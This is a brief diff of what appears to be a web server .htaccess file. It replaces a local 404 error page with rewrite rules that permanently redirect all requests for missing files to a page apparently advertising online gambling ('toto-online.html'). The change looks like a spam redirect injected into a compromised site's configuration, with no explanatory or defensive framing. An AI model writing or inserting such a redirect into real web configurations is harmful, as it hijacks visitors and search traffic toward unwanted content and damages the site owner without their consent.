@@ -1,1 +1,3 @@
-Error Document 404 /404.html
+RewriteEngine on
+RewriteCond %{REQUEST_FILENAME} !-f
+RewriteRule . https://visual.kaist.ac.kr/toto-online.html [L,R=301]
